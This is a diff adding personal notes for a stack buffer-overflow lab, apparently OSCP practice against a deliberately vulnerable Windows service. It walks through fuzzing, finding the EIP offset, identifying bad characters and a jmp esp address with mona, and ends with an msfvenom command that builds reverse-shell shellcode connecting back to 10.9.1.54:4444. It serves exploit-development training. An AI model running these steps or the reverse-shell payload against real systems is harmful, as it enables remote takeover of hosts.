@@ -1,0 +1,82 @@
+xfreerdp /u:admin /p:password /size:1366x768 /cert:ignore /v:10.10.46.154
+-------
+Step 1 - FUZZING
+-------
+Set 
+--
+!mona config -set workingfolder c:\mona\%p
+--
+ inside Immunity Debugger
+
+1.Fuzzing.py3
+
+-------
+Step 2 - CONTROL EIP
+-------
+
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
+Insert to var payload 2.ControlEIP.py3
+--
+python3 2.ControlEIP.py3
+--
+
+run 
+!mona findmsp -distance 2000
+inside ID
+Log data, item 19
+ Address=0BADF00D
+ Message=    EIP contains normal pattern : 0x6f43396e (offset 1978)
+
+
+--
+python3 2.1.ControlEIP-Recheck.py3
+--
+
+
+-------
+Step 3 - BADCHAR
+-------
+
+Run !mona bytearray -b "\x00"
+inside ID
+
+C:\mona\oscp\bytearray.bin
+--
+python3 3.BadChars.py3
+--
+to get ESP register points
+--
+!mona bytearray -b "\x00"
+--
+0198FA30
+--
+!mona compare -f C:\mona\oscp\bytearray.bin -a 0198FA30
+--
+
+\x07\x08\x2e\x2f\xa0\xa1
+--
+!mona bytearray -b "\x00\x07\x2e\xa0"
+--
+Log data item 4
+ Address=0198FA30
+ Message=Possibly bad chars:0x07,0x08,0x2e,0x2f,0xa0,0xa1,
+
+--
+python3 3.1.BadChars-confirm.py3
+--
+
+-------
+Step 4 - JUMP POINT
+-------
+
+--
+!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
+--
+
+Log data, item 11
+ Address=625011AF
+ Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
+
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.54 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f py -v payload -o shellcode.py
+
